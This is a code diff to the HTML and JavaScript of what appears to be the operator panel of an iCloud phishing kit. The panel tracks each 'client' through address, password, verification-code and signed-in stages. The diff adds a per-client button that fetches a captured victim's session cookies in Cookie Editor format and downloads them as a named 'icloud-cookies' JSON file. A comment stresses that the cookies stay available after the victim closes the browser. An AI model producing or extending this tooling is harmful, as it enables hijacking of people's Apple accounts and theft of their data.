@@ -449,7 +449,7 @@
       <div class="panel">
         <div class="head"><h3>Exports</h3><small>only for sessions that are allowed</small></div>
         <table>
-          <thead><tr><th>Client</th><th>Stage</th><th>Allowed to be exported</th><th></th></tr></thead>
+          <thead><tr><th>Client</th><th>Stage</th><th>Allowed to be exported</th><th></th><th>Cookies</th></tr></thead>
           <tbody id="exports-body"></tbody>
         </table>
       </div>
@@ -474,7 +474,8 @@
 
   var STAGES = ["Starting", "Address", "Password", "Verification code", "Signed in"];
 
-  var state = { clients: [], events: [], counts: {}, cookies: null, tab: "dashboard" };
+  var state = { clients: [], events: [], counts: {}, cookies: null,
+                cookie_name: "", tab: "dashboard" };
 
   function $(id) { return document.getElementById(id); }
 
@@ -628,17 +629,20 @@
   function drawExports() {
     var body = $("exports-body");
     if (!state.clients.length) {
-      body.innerHTML = '<tr><td colspan="4"><div class="empty">No clients yet.</div></td></tr>';
+      body.innerHTML = '<tr><td colspan="5"><div class="empty">No clients yet.</div></td></tr>';
       return;
     }
     body.innerHTML = state.clients.map(function (row) {
-      return "<tr>" +
+      return "<tr" + (row.known === false ? ' class="gone"' : "") + ">" +
         '<td><span class="id">' + escape(row.id) + "</span></td>" +
         "<td>" + escape(row.stage) + "</td>" +
         "<td>" + (row.export_allowed ? '<span class="pill warn">Allowed</span>'
                                       : '<span class="pill">Closed</span>') + "</td>" +
         '<td><button class="action ghost" data-sid="' + escape(row.id) + '">' +
         (row.export_allowed ? "Close" : "Allow") + "</button></td>" +
+        "<td>" + (row.export_allowed
+          ? '<button class="action shrink" data-cookies="' + escape(row.id) + '">Get</button>'
+          : '<span class="pill">Closed</span>') + "</td>" +
         "</tr>";
     }).join("");
     Array.prototype.forEach.call(body.querySelectorAll("button[data-sid]"), function (button) {
@@ -651,6 +655,32 @@
           await refresh();
         } catch (err) {
           alert(err.message);
+        }
+      });
+    });
+    // The cookies of one client, in the format Cookie Editor reads. A
+    // client whose browser has been shut down still has cookies: they
+    // were read while the browser was open.
+    Array.prototype.forEach.call(body.querySelectorAll("button[data-cookies]"), function (button) {
+      button.addEventListener("click", async function () {
+        var sid = button.dataset.cookies;
+        var note = $("ck-note");
+        note.className = "note";
+        note.textContent = "Reading…";
+        try {
+          var answer = await api("/clients/" + encodeURIComponent(sid) + "/cookies");
+          state.cookies = answer.cookies || [];
+          show("ck-result-panel", true);
+          $("ck-result-sub").textContent = answer.session + " · " +
+            state.cookies.length + " cookies";
+          $("ck-result").textContent = JSON.stringify(state.cookies, null, 2);
+          $("ck-download").disabled = false;
+          state.cookie_name = answer.session;
+          note.className = "note good";
+          note.textContent = "The cookies of " + answer.session + ".";
+        } catch (err) {
+          note.className = "note bad";
+          note.textContent = err.message;
         }
       });
     });
@@ -772,6 +802,7 @@
         state.cookies.length + " cookies";
       $("ck-result").textContent = JSON.stringify(state.cookies, null, 2);
       $("ck-download").disabled = false;
+      state.cookie_name = answer.session;
       note.className = "note good";
       note.textContent = "This is your own session.";
     } catch (err) {
@@ -787,7 +818,8 @@
     var url = URL.createObjectURL(blob);
     var link = document.createElement("a");
     link.href = url;
-    link.download = "icloud-cookies.json";
+    link.download = "icloud-cookies-" +
+      ((state.cookie_name || "session") + ".json").replace(/[^A-Za-z0-9_-]/g, "");
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
